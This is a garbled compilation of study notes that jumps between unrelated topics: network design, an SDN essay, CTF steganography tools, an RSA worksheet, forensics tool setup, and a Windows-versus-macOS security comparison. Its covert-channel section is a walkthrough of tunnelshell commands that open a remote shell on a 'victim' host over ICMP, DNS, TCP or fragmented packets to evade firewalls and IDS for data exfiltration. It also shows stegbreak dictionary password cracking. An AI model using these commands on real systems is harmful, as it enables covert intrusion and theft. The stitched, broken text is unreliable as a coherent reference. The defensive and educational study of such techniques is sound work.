  - 安全性的实施，可以利用 ACL 与端口隔离技术 来进行部署，当然 也可以高级点，dot1x、DHCP snooping+DAI+IPSGD等技术。 (一般 ACL 与端口隔离技术即可，除非有特殊需求在使用后续 的)。
  - 使用 AC+AP 的三层旁挂架构组件无线网络，实现内部网络使用 5G 接入网络，而访问则使用 2.4G 频率，并且实现，访客只能访问公司 提供的 WEB ⻚面与 Internet 访问，并且要求无线访客区之间实现隔
离。
  - 利用浮动路由 +NQA 或者 ip-link 技术实现自动切换
  - 使用 IPSEC 技术实现总部与分部之间的互访，通过加密验证等机制
来保证数据的安全性
  - 部署 L2TP Over IPSEC 实现出差员工能够拨入到内网，访问特定的
资源。
  - 开启 Telnet 或者 SSH 功能，实现访问，并且用 ACL 限制只能特点的
主机访问。
1. 园区网络:   - 说明:
 ⁃
  - 大中型企业网 / 校园网的最常⻅的园区网络架构，采用三层架构
(接入层，汇聚层，核心层)，双核心网络。
  - 根据网络需求，分为用户区，对内服务区，对外服务区，管理区，
互联网区等
  - 通过核心交换机和防火墙进行连接和隔离。
  - 互联网采用多出口连接，通过路由器进行博号和 NAT，通过流控产
品进行负载均衡 / 上网行为管理，拖过防火墙进行安全隔离。
  - 设备:路由器、交换机、无限AC/AP，防火墙、负载均衡/上网行为管
理、服务器
  - 技术:VLAN、TRUNK、MSTP\HSRP/VRRP、Etherchannel、WLAN、
OSPF、NAT、ACL、PPPOE、security SNMP等 政务网
 数据中心网    有哪些厂商在生产网络设备?  如何对网络设备进行操作?
 如何管理这么多网络设备?
 问题一:传统网络管理和部署非常麻烦
 网络设备之间如何协同工作?  问题二:分布式网络架构瓶颈凸显
    问题三:流量控制是棘手难题!  SDN是什么?         1.Research Background
Introduction
With the rapid development of the internet, nowadays the worldwide internet communication has grown rapidly from signal personal computer with local network to a huge international network.
More and more devices have been used for contracture this huge network strategy, and businesses are increasing extremally under the pressure to respond to the end-users’ and employees’ demand, which is become bigger than ever before, thus, all this require them to develop a faster computer system, global networks, and mobile devices.
For the low level devices, they all follow the standard internet protocol, which make it possible to combine devices form different vendor worked together, however, they may also have distinguished way in their management and configuration, example, usually all the devices are been controlled by the command line and website management interface, but as the vendor may have their unique operating system, there may be different command line or website interface, which is a big challenge for establishing a big network construction as it might need been combined with network devices from several vendors.
Also, even though we already have some useful network management system server (like H3C iMC, Huawei eSight) to manage those devices and examine the data link state, it already acted as an important component in may enterprises network system, this kind of the server put more focus on the monitor of the network devices instead of the configurations or change of the network strategy.
As a result, so far, there still shows a lot of problem in manage all the network devices together, in the following paragraph, we will discuss the main problem we are facing with nowadays network structure and how SDN — the Software-Defined Networking — can help us.
2. Weakness of nowadays network structure. 2.1 Hard to organize and manage.
Most of the internet devices use the internet protocol to communicate, and when establishing a network, all the devices need to following the basic step: connected properly; casting their information and then select the best path according to the different protocol. So when there is a down devices or some change in the devices, all the internet devices may need to acknowledge this change to all other devices, which may cause a wish of the bandage and reduce the performance.
2.2 Leak of Scalability.
Nowadays, most of the network system are hierarchical, built with tiers of Ethernet switches arranged in a tree structure, each level calculate undependably, also usually we use a lot the techniques (like QoS/TE etc...) to realize the control of the bandage, but no matter you control it by software or hardware, most of the traditional product can only provide a link of static-management for the bandage, established specific data link according to the customer request, but it cannot manage the bandwage intelligently or change it according to the real time network situation.
2.3 Hard to control the data flow.
All the network devices have been setup their functions or certificate way to work, like switch transfer the package according to the MAC table and router transfer the package through routing table. But so far we cannot separate the function and devices, and customize the function as the request, let the user decided their preferred way for devices to work, make the devices programmable according to the real needs, reduce the amount of the devices and customize your own devices. This design made sense when client-server computing was dominant, but such a static architecture is ill-suited to the dynamic computing and storage needs of today's enterprise data centers, campuses, and carrier environments.
Thus, trying to organize those network devices separately in a more efficient way has become a big goal for the next generation of the cyber world. for establishing a stable and faster network, service providers and enterprises are constantly exploring new ways to keep up with fast evolving technology trends.
Software-Defined Networking (SDN), is a new technology improving widely network performance and monitoring, it allows people to managing the network devices remotely and programming those configurations in a more efficient way, it is a revolution that will not only change the structure of those huge network, the model of the network devices, but also the working daily of the network administrators.
The Open Network Foundation (ONF) defines Software-Defined Networking as follows: “The physical separation of the network control plane from the forwarding plane, and where a control plane controls several devices.”
SDN usually use the OpenFlow protocol, it can establish a remote communication and determine how the network packets between two ends can be sent and the path and the network devices that need to pass.
3. Architecture.
Mainly it has been separated into three-layer, application layer, control layer and infrastructure layer:
The application layer: provide the service and the application. (including internet management, security and data control etc.)
Control layer: provide the main control and management. (include protocol, strategy, and the link state of the connection etc.)
Infrastructure layer: provide the basic establishment of all the hardware devices.Within this Software- defined networking infrastructure, this capability leads to a more proactive and dynamic applications which provide more control of the configuration of the network infrastructure and provide the administrator a way to build a network with increased application awareness and intelligence.
By using this Software-defined networking, it also allows the infrastructure establishment become much more automated and adaptive to match the different needs of the performing service and the requesting.  4. Functionalities
Combined with the main goal of the centralization of the control, Software-defined networking can provide many characteristics, example:
4.1 Directly programmable and programmatically configured:
Make the network control directly programmable as the SDN is decoupled form forwarding functions, whenever there is a desired behavior of the network, SDN can forwarding instructions for packets to the appropriate network devices through some form of the standardized protocol (like OpenFlow).
SDN let network devices been able to be managed, configured, secured via SDN dynamically.
4.2 Centralized control and management:
Nowadays, in our network, the way we control the device can actually be defined as a kind of the data traffic, also, all the important functions were divided into separate network devices. So, for a better organization of all these devices, SDN created a new way to pull control functions out of the network devices and gather then to a centralized location. Even most of the SDN solutions still need some sort of the decentralized control functionality that require a lower level distributes routing control mechanism, and the degree of control plane centralization may vary from one solution to another, it has improved the way we control the devices so much.
4.3 Overlay networks:
Provide a new useful construct for the creation of logical networks that can be leveraged by edge devices and applications.
With this characteristic, network administrator will be able to create the logical networks on top of the existing physical network without having to involve the underlying physical network. This is very useful for provisioning multi-datacenter environments.
It can provide a much larger number of layer-2 networks than VLANs.
It provides a faster and simpler network provisioning and orchestration, because the physical network in no longer needed.
4.4 Open Standards-based and Vendor-neutral
SDN can simplify the network design and operation because they are implemented through open standards, and all instructions are provided by SDN controllers instead of multiple, vendor-specific devices and protocols.
5. Development.
Since Google proofed that SDN can organize all network devices by a more efficient way and with lower cost, many enterprises already joined in and create their own SDN structures, example: AT&T, announced that they will focus more on the development of the software center environment at September 2013. Verizon, declared their plan of switching to SDN network and list of important cooperate partner for some significant techniques. NTT, since 2013, is using SDN to connect and organize their cloud data center around the world.
After the initial stage of technical speculation, we still facing a lot of problem about the specific implementation and commercialization problems that come with it, such as, how can SDN really change the way the network is built and operated? How we can adjust our way of service creation, customization, implementation, monitoring and commercialization to SDN? The needs of development of the IP and optical integration, and the security of SDN. 很多情况下通过ubuntu或者kali的源未必是最新的，因此需要使用 git安装，为了更好的更新，需要首先卸载掉电脑的binwalk
卸载binwalk:
apt-get remove binwalk
 使用git安装binwalk:
git clone https://github.com/devttys0/binwalk
 安装:
sudo python setup.py install 如果是 2.7 环境，需要安装一个插件:
sudo apt-get install python-lzma
 其他功能的安装:
https://github.com/devttys0/binwalk/blob/master/INSTALL.md
比如:对某些已加密固件: sudo apt-get install python-crypto
  一、StegSolve
StegSolve是一款基于Java开发的流行图片隐写分析软件，其支持 常⻅的图片文件格式，可以对不同的文件进行结合(包括XOR、 ADD、SUB等操作)，可以对图片文件格式进行分析，可以提取 GIF文件中的帧等，覆盖了基本的图片隐写分析需求。
二、StegDetect
Stegdetect通过统计测试来分析图像文件中是否包含隐藏内容，它 运行静态测试以判断隐藏的内容是否存在。此外，它还会尝试识别 隐藏内容是通过哪个隐写工具嵌入的。
如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在 检测结果后面使用1~3颗星来标识隐藏信息存在的可能性大小，3 颗星表示隐藏信息存在的可能性最大。 三、InvisibleSecrets
Invisible Secrets是一套简单易用的文件加密软件，可以使用它为 重要文件或是整个文件夹进行加密。该软件可以在 JPG 文件里面 附带加密文本信息。
 安装 Stegdetect的Winodws安装文件或源代码可以从outguess.org网站下
载，zip或tar压缩包中包含命令行和GUI两个版本的安装文件。
除outguess.org外，还可以在BackTrack网站(https://backtrack- linux.com/forensics-auditor/)上获取到。
      0x01 outguess
linux下载安装比较简单:
 http://download.csdn.net/detail/florak/5620983
  ./configure && make && make install
执行以下命令解密:
 outguess -r ‘/root/Desktop/angrybird.jpg’ -t 11.txt
  0x02 mp3stego
mp3stego(http://www.petitcolas.net/steganography/
    mp3stego/)主要用于mp3隐写
    使用非常简单
加密:encode -E hidden_text.txt -P pass svega.wav
svega_stego.mp3
解密:decode -X -P pass svega_stego.mp3
0x03 binwalk,dd,foremost命令 linux下binwalk命令常用于分析隐写文件，dd命令用于提取文
件。
 分析:
root@kali:~/Desktop# binwalk baozou_new.jpg
DECIMAL HEX DESCRIPTION --------------------------------------------------------------------------------------- ----------------------------
0 0x0 JPEG image data, JFIF standard 1.01
4308 0x10D4 Zip encrypted archive data, at least v2.0 to extract, compressed size: 8890, uncompressed size: 9990, name:
"qr.png"
可以看出 0x10D4位置后是zip文件。
 提取文件:
 root@kali:~/Desktop# dd if=baozou_new.jpg of=2.zip bs=1
    skip=4308
 9065+0 records in
 9065+0 records out
9065 bytes (9.1 kB) copied, 0.0475933 s, 190 kB/s
foremost命令同样可以达到效果:
 foremost -v -i baozou_new.jpg -o /root/Desktop/xx
支持恢复如下格式:avi, bmp, dll, doc, exe, gif, htm, jar, jpg,
mbd, mov, mpg, pdf, png, ppt, rar, rif, sdw, sx, sxc, sxi,
sxw, vis, wav, wmv, xls, zip。
0x04 F5-steganography
git clone https://github.com/matthewgao/F5-steganography
      cd F5-steganography
 java Extract ../123456.jpg -p 123456
 后会生成output.txt文件，里面就有flag了
Stegdetect
   Stegdetect的tar或zip格式的安装包中，有个名为XSteg的GUI版本的 安装文件。GUI版本的所有选项都与命令行版本一样，因此它的唯 一用途就是当命令行版本受损时，可以作为替代工具。
  1. Download the stegdetect.rpm
  2. Install alien (red-hat).
apt-get install alien
  2. $ ls the rpm
  3. alien ****.rpm
  4. Get the ***.deb
5. apt install /. ***.deb
    6. Use it
Stegdetect -tjopi -s 10.0 file99.jpg
   - It use jphide stegdetect -s [number] steg.jpg
  - - setting sensitivity 7. Find the password
Stegdetect的主要选项如下:
q – 仅显示可能包含隐藏内容的图像
n – 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的
文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是
1.1，则禁用OutGuess检测。
s – 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的
   敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可
能性越大。
d – 打印带行号的调试信息。
V- 显示软件版本号。
t – 设置要检测哪些隐写工具(默认检测jopi)，可设置的选项如下:
  - j – 检测图像中的信息是否是用jsteg嵌入的。
  - o – 检测图像中的信息是否是用outguess嵌入的。
  - p – 检测图像中的信息是否是用jphide嵌入的。
  - i – 检测图像中的信息是否是用invisible secrets嵌入的。
  - f - Tests if information has been hidden with F5.
  - F - Tests if information has been hidden with F5 using a more
sophisticated but fairly slow detection algorithm.
  - a - Tests if information has been added at the end of file, example by
camouflage or appendX.
  - 当然误报率还是有的
  - 如果可能包含隐藏信息，Stegdetect会在检测结果后面使用1~3颗星
来标识隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能 153

性最大。
  - 持续的研究分析表明Stegdetect对高质量的数字图像的检测效果更
佳，like数码相机照片
jphide
0x00 隐写原理 Jphide是基于最低有效位LSB的JPEG格式图像隐写算法，使用JPEG图像作为载
体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT 变换域上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish 算法有较强的抗统计检测能力。 由于JPEG图像格式使用离散余弦变换(Discrete Cosine Transform，DCT) 函数来压缩图像，而这个图像压缩方法的核心是:通过识别每个8×8像素块 中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降 低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方 法。因为丢失了部分数据，所以DCT是一种有损压缩(Loss Compression) 技术，但一般不会影响图像的视觉效果。
0x01 隐写过程 Jphide隐写过程大致为:先解压压缩JPEG图像，得到DCT系数;然后对隐藏信
息用户给定的密码进行Blowfish加密;再利用Blowfish算法生成伪随机序 列，并据此找到需要改变的DCT系数，将其末位变为需要隐藏的信息的值。 最后把DCT系数重新压回成JPEG图片，下面是个人对隐写过程理解画出的  大致流程图。
0x02 隐写实现
JPEG图像的信息隐藏软件JPHS，它是由Allan Latham开发设计实现在Windows
和Linux系统平台针对有损压缩JPEG文件进行信息加密隐藏和探测提取的工 具。软件里面主要包含了两个程序JPHIDE和JPSEEK， JPHIDE程序主要是 实现将信息文件加密隐藏到JPEG图像功能，而JPSEEK程序主要实现从用 JPHIDE程序加密隐藏得到的JPEG图像探测提取信息文件，Windows版本的 JPHS里的JPHSWIN程序具有图形化操作界面且具备JPHIDE和JPSEEK的功 能。  ⁃
由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG 格式-JPEG文件交换格式(JPEG File Interchange Format，JFIF)作为示 例。
这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI(Start of Image)和应用程序保留标记APP0(Application 0)，JPEG文件交换格式 的JPEG图片开始前2个字节是图像开始标记为0xFFD8，之后2个字节接着便 是应用程序保留标记为0xFFE0，应用程序保留标记APP0包含9个具体字段， 这里介绍前三个字段，第一个字段是数据⻓度占2个字节，表示包括本字段 但不包括标记代码的总⻓度，这里为10个字节，第二个字段是标识符占5个 字节0x4A46494600表示“JFIF0”字符串，第三个字段是版本号占2个字节，这 里是0X0101，表示JFIF的版本号为1.1，但也可能为其它数值，从而代表了其 它版本号。
⁃
 1. 缀入txt
 2. 选择“Hide”选项之后在两次文本框输入相同的密码，输入要包含的文本。  3. Save new file.  4. 提取 如果不知道图片是基于什么方式进行信息隐藏，用Stegdetect先进行探测。
How to find the secret.
  - 用stegdetect下的stegbreak字典破解
  - 同样图片和stegbreak.exe在同一目录下
  - stegbreak.exe -r rules.ini -f password.txt -r p hide.jpg
  - jphide[v5](123456)中的123456即为密码 使用jphide下的工具JPHS从hide.jpg图片提取出隐藏信息
  ⁃
 ⁃
4.然后打开保存的txt文件，即得flag   Features:
steghide
compression of embedded data
encryption of embedded data
embedding of a checksum to verify the integrity of the extracted data support for JPEG, BMP, WAV and AU files
1. 官网地址:http://steghide.sourceforge.net/documentation.php 2. Install steghide
apt-get install steghide
     3. 先要cd到有文件的当下目录 4. 在文件中隐藏数据
steghide embed -cf 1111.jpg -ef embeddate.txt
hide secret.txt with password "mypass", and create a new file, where the file is
hidden, and don't compress data
  - steghide --embed -ef secret.txt -cf IMG_4422.JPG -sf steg.jpg -p
mypass -Z
same as the previous but with compression
  - steghide --embed -ef secret.txt -cf IMG_4422.JPG -sf steg.jpg -p
mypass -
5. 检查图片中隐藏的信息
steghide info 1111.jpg
6. 导出图片中信息
steghide extract -sf 1111.jpg
steghide --extract -xf mysecret2.txt -sf steg2.jpg -p mypass -
StegoSuite
Features
BMP, GIF and JPG supported AES encryption of embedded data
Automatic avoidance of homogeneous areas (only embed data in noisy areas) Embed text messages and multiple files of any type
Easy to use
     1. Install stegosuite
apt-get install stegosuite
  2. Embed text file in Image using Stegosuite
You need to run it from Application menu (or you can just search it).
Go to File > Open and open the image you want to use.
Right-click on the file section and select add files and select your secret.txt file. Type in a passphrase and click on embed.
Few seconds and it will create a new file picture_embed.jpg.
3. Extracting text file from Image using Stegosuite
If you want to extract text file or data from the image
simply Open the image, type in the passphrase and click on Extract.
   Most of the data on the data side will also not make sense, but there will usually be a few key pieces of text that will tell you what kind of file you are working with.
 scroll down a little in the data inspector, you’ll see the following at the end of one of the paragraph sections: ▪


##  convert 隐密的 channel (type of network)
  - simple yet very effective mechanism for sending and receiving unauthorized info / data between machines
  - without alerting any firewalls and IDS's on a network
- transfers information over, within a computer system, or network that is outside of the security policy.
 use protocol in a way it was not intended to be used
  One way to defeat a multi-level security solution
 ▪


##  seems as generic traffic to any network monitor device/application and network admin
uses a hidden network to escape themselves from firewall, IDS... considered as steganography, but it is not exactly steganography
  - steal information from the target machine through the undetectable network.
  - data exfiltration 溜出敌军阵地 : endpoint users can use the convert channel for undetectable communication from network admin.
Difference:
encrypted communication: do not hide the fact that there has been a communication, encrypted the data travelling between both
endpoints.
convert communication: the data stream is garbled 混乱的 and
lasting 维持 by an unauthorized party. Type of convert channel
Storage convert Channel:
  - Communicate by modifying a “storage location”, that would allow the direct/indirect or writing of a storage location by one process and reading of it by another.
  - embed hidden data into bits of the transferred network packets. Reserved bits or unused bits of the protocol are mainly used to transmit information. example, DSCP bits in IP protocol.
     ▪


##  Timing convert channels:
  - Perform operations that affect the “real response time
observed” by the receiver.
  - hidden information through the timing information of network packets. Normally, the timing difference between network packets is used to deliver a convert message.
Tunnelshell
It is possible to use almost any protocol to make a convert channel.
The huge majority of convert channel research has based on layer 3 (Network) and layer 4 (Transport) protocols such as ICMP, IP and TCP.
Layer 7 (Application) protocols such as HTTP and DNS are also frequently used.
This mechanism for conveying the information without alerting network firewalls and IDSs and moreover undetectable by netstat.
tunnelshell?
program written in C for Linux users that works with a client-server paradigm.
The server opens a /bin/sh that clients can access through a virtual tunnel.
It works over multiple protocols, including TCP, UDP, ICMP, and RawIP, will work. ▪


## Moreover, packets can be fragmented to evade firewalls and IDS. Let’s go with practical for more details.
Requirement
Server (Kali Linux) Client (Ubuntu18.04)
Tool for convert Channel (Tunnelshell) which you can download from
Install tunnelshell on both endpoints. Once you download it, then extract the file and compile it as shown below:
    ⁃
tunnelshell_2.3.tgz
tar xvfz
 ⁃
Make
 completion, execute the following command in the terminal to
open communication channel for the server (Attacker).
  - sudo ./tunneld
  - (By default, it sends fragment packet, which reassembles at
the destination to evade from firewall and IDS.)
  To connect with tunnelshell, we need to execute the following command on the server (Attacker’s machine) which will establish a convert channel for data exfiltration.
  - ./tunnel -t frag 10.10.10.2
  - frag: It uses IPv4 fragmented packets to encapsulate data.
When some routers and firewalls (like Cisco routers and default Linux installation) receives fragmented packets without headers for the fourth layer, they permit pass it even if they have a rule that denies it.
  - As you can observe that it is successfully connected to 10.10.10.2 and we are to access the shell of the victim’s machine.
    - if you check the network statics:
  - Netstat: will not observe any process ID for tunnelshell.
  - ps command: check in process for tunnelshell.
  - Netstat command: check its process id. ⁃
 ps |grep .tunneld netstat –ano
 ⁃
 ⁃
  - Wireshark: captured the convert traffic and sniff the data that
was travelling between two endpoint devices.
  - take a look of network traffic generated between 10.10.10.1 (Attacker’s IP) and10. 10.10.2 (Victim’s IP) using .
  - The network flow looks generic between both endpoints, but if it monitors properly, then a network administrator could sniff the data packet.  ⁃
convert ICMP Channel
Ping: the use of ICMP communication, use icmp echo request and icmp echo reply query to establish a connection between two hosts, so, execute the command:
  - sudo ./tunneld -t icmp -m echo-reply, echo
To connect with tunnelshell:
  - execute command on the server (Attacker’s machine)
  - it will establish a convert channel for data exfiltration.
  - ./tunnel -t icmp -m echo-reply,echo 10.10.10.2
⁃
  - it is successfully connected to 10.10.10.2 and the attacker is able to access the shell of the victim’s machine.
Wireshark: you will capture the traffic.
  - It will notice the ICMP echo request and reply packet is
being travelled between both endpoints.
   - If analysis these packets, you will be able to see what kind of payload is travelling as ICMP data.
 convert HTTP Channel
It establishes a virtual TCP connection without using three-way handshakes.
It doesn’t bind any port, so you can use a port already use it by another process, therefore execute the below command:
  - sudo ./tunneld -t tcp -p 80,2000
To connect with tunnelshell
  - execute the following command on the server (Attacker’s
machine)
  - it will establish a convert channel for data exfiltration.
  - ./tunnel -t tcp -p 80,2000 10.10.10.2
⁃
   - It is successfully connected to 10.10.10.2, attacker is able to access the shell of the victim’s machine.
Wireshark: you will notice a tcp communication establish without three-way-handshake between source and destination..
 convert DNS Channel
To establish DNS convert channel, need to run UDP tunnel mode on both endpoint machines.
Execute command on the victim’s machine:
  - sudo ./tunneld -t udp -p 53,2000
Similarly, execute following on your (Attacker) machine
  - to connect with a tunnel.
  - ./tunnel -t udp -p 53,2000 10.10.10.2
  Wireshark: you can observe the DNS 畸形的 malformed packet contains the data travelling between both endpoint machine.
 Conclusion:
convert channel does not send encrypted data packet while data
exfiltration,
therefore, it can easily sniff, and network admin can easily conduct data loss and risk management. A three-digit number is such that its second digit is the sum of its first and third digits.
Prove that the number must be divisible by 11.
a number like 62345678987654555548 6 - 2 + 3 - 4 ...?
If it is 0 or 11 or -11, it is divisible...
if it isn't, no.
First (from the first digit), divide the no: into groups of 2.
Eg: 62 34 56 78 98 76 54 55 55 48
Then, add them up.
Eg: 62 + 34 + 56 + 78 + 98 + 76 + 54 + 55 + 55 + 48 = 616
If the sum is more than 100, repeat step 1 and 2.
Eg: 6 16
6 + 16 = 22
If the sum obtained is divisible by 11, then the initial no: is divisible by 11.
Prime number:
  - p: __151__ q: ___197____
  - modulus: __29747___
  - Euler totient: __29400___
  - Public key: ___37___ Private key: ___3973____
 the product p*q
 the product (p-1)*(q-1) Plain text: HELLOALEXWANGMU
Obtain a numeric representation for each letter based on its
position in the alphabet (A→0, b→1, ... Z→25). From:
  - Trigraph   - HEL
  - LOA
  - LEX
  - WAN   - GPU
From:
⁃
Encipher each plaintext trigraph code by computing (Plaintext trigraph code)Public Key, dividing the
result by the Modulus and taking the remainder = enciphered trigraph codegv
Convert each enciphered trigraph code into a quadragraph:
  - Divide the code by 263. (17576). The quotient is the code for the first letter of the
 Trigraph code = (First Letter Code) * 262 + (Second Letter Code) * 26 + (Third Letter code).
 quadragraph. The spreadsheet uses the remainder to get codes for the other three letters.
  - Divide the remainder from the first step by 262. The quotient is the code for the second letter. The spreadsheet uses the remainder to get the codes for the other two letters.
  - Divide the remainder from the second step by 26. The quotient is the code for the third letter
  - and the remainder is the code for the fourth letter ⁃
   - Ciphertext: __________BCSUBQAPAYOCCBEXBUPF_____________ Decoding worksheet:
  - Split the ciphertext up into quadragraphs (instead of trigraphs).
  - Obtain the numeric representation for each letter and compute a numeric code for
each trigraph using the formula
  - (First Letter Code) * 263 + (Second Letter Code) * 262 + (Third Letter Code) * 26 + (Fourth Letter Code).
Encipher each ciphertext quadragraph code by computing
(Ciphertext quadragraph code)Private Key,dividing the result by the
Modulus and taking the remainder
  - Convert each deciphered quadragraph code into a trigraph.
  - Divide the code by 262. The quotient is the code for the first letter.
  - Divide the remainder from the first step by 26. The quotient will be the code for
the second letter
  - and the remainder the code for the third.    - OS X: % brew install testdisk
Install Oracle Java and set JAVA_HOME.
OS X: Use The Oracle website: https://www.java.com
Set JAVA_HOME with something like: export JAVA_HOME=`/usr/ libexec/java_home` in .bash_profile
Install The Sleuth Kit Java Bindings
OS X: Install The Sleuth Kit from brew. -- % brew install sleuthkit
* Install Autopsy *
- Extract the contents of the Autopsy ZIP file to a folder. - Open a terminal and cd into the Autopsy folder.
cd /Users/luo/Downloads/sw/autopsy
- Run the unix_setup.sh script to configure Autopsy % sh unix_setup.sh
* Running Autopsy *
- In a terminal, change to the ‘bin’ directory in the Autopsy folder. - Run Autopsy
% ./autopsy
* Limitations (Updated May 2018) *
- Timeline does not work on OS X
- Video thumbnails are not generated (need to get a consistent version of
OpenCV)
- VHD and VMDK files not supported on OS X
   Windows 10与macOS:18个安全特 性大比拼
0. 操作系统基本安全能力
微软 Windows 10 安全 Windows诞生的头10年，史上最好攻击OS。
微软共同创始人比尔 · 盖茨在 2002 年 1月15日写下了著名的“可信 计算”备忘录，指引微软投入更多资源到提升 Windows 安全性上。
微软不仅让 Windows 从出厂时就更安全，还创新或协作创新了数 十项计算机安全技术。
盖茨 2002 备忘录的最重要成果之一，就是安全开发生命周期 (SDL) 的大规模采用。
SDL让每个软件开发项目从一开始就引入安全编码和安全实践。 SDL大幅减小了每千行代码的漏洞率，增加了很多安全功能和选 择，缩小了攻击界面，提供了更安全的默认设置。
Windows 10 的安全性，正是微软提供适度安全的跨设备通用操 作系统工作的延续。
苹果 MacOS 安全
很⻓时间以来，Mac 用户都无需担心病毒和恶意软件。Mac 操作 系统的漏洞极少有被利用的。但不过是因为 Windows PC 成为了 黑客的最佳攻击目标。
直到今天，Mac 系统的潜在威胁情况仍不像其他平台那般严峻， 但威胁越来越多，越来越复杂高端。
苹果设备威胁:2017 年是安全事件爆发的一年。
2月，虚假 Adobe Flash 安装包内嵌MacDownloader恶意软件，
可致Keychain数据(包含用户名和口令等个人信息)渗漏。
去年秋天，最新 Mac 操作系统 High Sierra 的发售版中检测到数 个漏洞，可令黑客绕过口令获取特定区域的 root 权限。之后 不久，名为“幽灵”和“熔断”的处理器漏洞曝光，世界上大部 分计算机都受影响。 1. 启动保护
Windows 10: 在预启动、启动和启动后防护上，微软一直走在前列。
一些从其他开源操作系统项目中借鉴过来的，有些则来自于业界 倡议，但大多是微软自主研发的。
如今，微软将很多保护技术都纳入了 Windows Defender System Guard 旗下，启动保护就是其中的“Secure Boot(安 全启动)”。
Secure Boot
要求预启动过程检查计算机是否在主板上安装并启用了 更安全 的最新版 统一可扩展固件接口(UEFI)和可信平台模块 (TPM)。
这两个芯片在接受新代码或设置变更之前都会进行加密验证，验 证不通过就不允许写入和修改，还能加密评估和验证启动过 程。
前期验证过的组件往往会安全存储下后面组件之前被验证过的散 列值，只有二者匹配，启动过程才会继续。微软也将该启动 过程称为 “Measured Boot(测量启动)”or“ Trusted Boot(可信 启动)”。
只要有东⻄ (比如 rootkit) 试图修改该预启动或 OS 启动过程，这 两个芯片之一就会收到警报，要么阻止修改，要么在用户下 次开机时给出重要警告。
  - 如今不太听说此类威胁了，就是如今我们有了 Secure Boot 之类的预启动和启动保护过程。对黑客和恶意软 件作战中少有的几个大成功之一。
UEFI和TPM都是开放标准，任何厂商或OS可用。
UEFI替代了容易出漏洞的BIOS
PM托管着核心加密功能——包括关键系统密钥的安全存储。
用了 UEFI 和 TPM，OS 供应商就能更好地维护其 OS 产品及其他 应用 (比如数据存储加密) 在机器启动时和启动后的完整性。
Windows还有个名为“可配置代码完整性(CI)”的功能: 可保证在可信启动过程完成后只有预先定义过的可信代码能够运 行。CI 是通用 OS 在只执行可信代码方面的重大进步. 但微软已测试通过的操作之外的那些普通操作想要合理运用
CI，还得经过慎重的计划和测试。 不过，如果想尽可能保证 Windows 操作系统安全，还是可以借
助 CI 的力量。
在防止黑客使用行业标准预启动 I/O 接口 (比如直接内存存取 (DMA) 或 IEEE 1394) 控制磁盘或设备方面，微软也对其所有 OS 版 本进行了改进。对每一家 OS 供应商来说，在不严重影响运行速度 或削弱 OS 性能的同时防止这些接口被恶意使用，确实是一项巨大 的挑战。微软不仅增强了预启动 I/O 接口防护，还更进一步，允许 实质上已成 OS 本身一部分的设备驱动程序可以按设备单独安装。
Windows 10 还引入了设备健康认证(DHA)的改进版。DHA可认证 操作系统，使其干干净净地启动，还可对其他进程进行执行前的 验证。
健康检查中包含什么内容取决于 OS、OS 管理员和他们使用的 DHA 服务。
客户可自己进行 DHA 检查，也可以将之外包给微软或第三方提 供商。 macOS:
苹果采用了防护能力弱得多的 UEFI 早期版本——EFI 1.0，而没有 采用后来更安全的 UEFI 新版本。但是，苹果自主研发了其他很多 类似的专利防护技术。
因为是专利技术，苹果并未公布其相关细节，很难就其预启动和 启动防护措施进行对比分析。
不过，Mac 上可以启用多个启动防护:
尤其能够防止别人访问 Mac 硬盘上的数据。标准用户账户口令 可提供对正确启动的 Mac 机的基本保护，但防不住能接触到 Mac 机且具备“目标磁盘模式”知识的黑客。
为防止未授权访问，启动盘可用 FileVault 2 加密，而 Mac 可以 设置成不能通过固件口令从外部设备启动。FileVault 2 采用 AES 256 加密算法进行整盘加密，块大小 128 位，AWS-XTS 模式，可阻止无解锁权限的账户看到磁盘上的任何内容。
2017年底发布的 iMac Pro 就加载了苹果研发的T2芯片集。该芯 片集整合了一系列硬件子系统，并引入了一些最终会用在其他 Mac机上的安全功能。
2. 内存保护 Windows 10:
微软在内存保护上做了很多工作，通常是为了防止初步漏洞利 用、零日漏洞和提权攻击。大多数内存保护措施都纳入到了 Windows Defender Exploit Guard 中，其中很多都来自于之前被 称作“增强缓解体验工具包 (EMET)”的漏洞利用防护附件。
数据执行保护 (DEP) 自 Windows XP 时代就已出现。 DEP旨在防止恶意缓冲区溢出，也就是阻止恶意程序将可执行代
码放到数据区并诱骗OS执行该代码。 DEP能令OS拒不执行标记为数据区域里的任何东⻄。
Windows Vista引入了很多新的安全特性，比如“地址空间布局随 机化(ASLR)”、“结构化错误处理复写保护(SEHOP)”和“受保护进 程”。 ASLR会在每次启动时为通用关键系统进程分配不同的内存空
间，让想操纵并修改这些进程的恶意程序更难以找到它们。
SEHOP会在发现执行错误时停止恶意流氓程序的安装或执行过 程。这些安全功能连同其他预防性技术演进成了微软现在所 谓的 Control Flow Guard (控制流保护)。微软的每个程序都 启用了该保护措施，Visual Studio 15 之类的编程工具也可使 用该安全功能。
EMET在Vista中就已引入，作为帮助防止零日攻击的附加组件。 该工具包含了内存保护、数字证书处理改进(比如证书锁 定)、早期警告和攻击上报改进(向OS管理员和微软报告攻击 情况，以便发现新攻击的技术细节)。EMET演化出了15种以 上的缓解措施，其经验证的保护功能备受推崇，所以微软将 其整合进了 Windows 10 Creator Update 中(以 Windows Defender Exploit Guard 的姿态出现 )。
macOS: Mac机在英特尔处理器中内置了XD(执行禁用)功能，防止用于数 据存储和可执行指令存储的内存相互访问。 恶意软件常会利用数据内存和指令内存间的相互访问来入侵系
统，但 XD 的存在为此类恶意行为设置了障碍。 Mac机的macOS内核同样应用了ASLR，通过随机分配目标地址让
攻击者难以定位应用程序漏洞。
基本上，只要启用了 ASLR，黑客就更容易直接搞崩要利用的应 用，而不是获得应用权限来作恶。
3. 登录/身份验证
Windows 10: OS一旦启动起来，最重要的安全功能就是限制谁能登录了。
